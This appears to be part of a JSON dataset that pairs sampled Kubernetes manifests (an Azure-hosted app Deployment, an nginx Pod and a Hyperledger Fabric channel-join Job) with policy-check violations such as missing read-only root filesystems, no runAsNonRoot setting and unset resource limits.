+    "violation_text": "The container \"edisonsupipelinesjavascriptdocker\" is using an invalid container image, \"containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
+  },
+  {
+    "id": "01392",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" does not have a read-only root file system"
+  },
+  {
+    "id": "01393",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01394",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has cpu request 0"
+  },
+  {
+    "id": "01395",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0444.yaml",
+    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker\n        ports:\n        - containerPort: 8080\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"edisonsupipelinesjavascriptdocker\" has memory limit 0"
+  },
+  {
+    "id": "01396",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"pod-exemplo\" does not have a read-only root file system"
+  },
+  {
+    "id": "01397",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
+    "policy_id": "run-as-non-root",
+    "violation_text": "container \"pod-exemplo\" is not set to runAsNonRoot"
+  },
+  {
+    "id": "01398",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
+    "policy_id": "unset-cpu-requirements",
+    "violation_text": "container \"pod-exemplo\" has cpu request 0"
+  },
+  {
+    "id": "01399",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0445.yaml",
+    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n",
+    "policy_id": "unset-memory-requirements",
+    "violation_text": "container \"pod-exemplo\" has memory limit 0"
+  },
+  {
+    "id": "01400",
+    "manifest_path": "data/manifests/the_stack_sample/sample_0446.yaml",
+    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: joinchannel\nspec:\n  template:\n    metadata:\n      name: joinchannel\n    spec:\n      volumes:\n      - name: sharedvolume\n        persistentVolumeClaim:\n          claimName: shared-pvc\n      containers:\n      - name: joinchannel1\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org1peer1:30110\n        - name: CORE_PEER_LOCALMSPID\n          value: Org1MSP\n        - name: CORE_PEER_MSPID\n          value: Org1MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel2\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org2peer1:30210\n        - name: CORE_PEER_LOCALMSPID\n          value: Org2MSP\n        - name: CORE_PEER_MSPID\n          value: Org2MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
+    "policy_id": "no-read-only-root-fs",
+    "violation_text": "container \"joinchannel1\" does not have a read-only root file system"
+  }
+]
